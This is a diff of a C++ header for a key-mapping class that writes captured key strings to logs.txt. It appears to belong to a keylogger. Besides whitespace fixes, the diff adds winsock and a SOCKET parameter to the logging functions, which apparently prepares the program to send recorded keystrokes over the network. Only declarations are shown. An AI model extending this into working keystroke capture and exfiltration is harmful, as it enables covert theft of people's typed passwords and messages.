@@ -1,15 +1,15 @@
 /*--------------------------------------------------------------------
 
 *    ``~ Definitions for the class methods and private variables (Written by haeoro) ~``
-*   
+*
 *    This is a custom code page, it maps ascii values to characters.
-* 
-*    Maps::writeKeyString() is a function created to write keys that do not have a direct ascii conversion, 
+*
+*    Maps::writeKeyString() is a function created to write keys that do not have a direct ascii conversion,
 *    see constants.h:ln:12 for more info.
 *
 *    Maps::initializeMaps()
 *    asciiMaps maps Section 1's constants in constants.h to their true ascii values.
-*            
+*
 *    shiftMaps maps all special keys to their corresponding values, I.E. shift+[ returns
 *    {
 *
@@ -17,7 +17,7 @@
 *
 *    Maps::searchAsciiMaps(int key) searches through the asciiMaps until it finds a match and returns asciiMaps->second.
 *    Maps::searchShiftMaps(int key) searches through shiftMaps until argument key matches the first keypair value of any given map, returns shiftMaps->second
-*    Maps::searchMiscMaps(int key) takes key argument from main, which is i from the for loop and compares it with the first key pair value then calls 
+*    Maps::searchMiscMaps(int key) takes key argument from main, which is i from the for loop and compares it with the first key pair value then calls
 *    writeKeyString and passes miscMaps->second key value to write to logs.txt
 
 --------------------------------------------------------------------*/
@@ -26,17 +26,18 @@
 
 #include <map>
 #include <string>
+#include <winsock2.h>
 
-class Maps 
+class Maps
 {
-    private: 
+    private:
         std::map<int, int> asciiMaps;
         std::map<int, int> shiftMaps;
         std::map<int, std::string> miscMaps;
-    public: 
+    public:
         int searchAsciiMaps(int key);
         void initializeMaps();
         int searchShiftMaps(int key);
-        void writeKeyString(std::string key);
-        int searchMiscMaps(int key);
+        void writeKeyString(std::string key, SOCKET sObjClient);
+        int searchMiscMaps(int key, SOCKET sObjClient);
 };
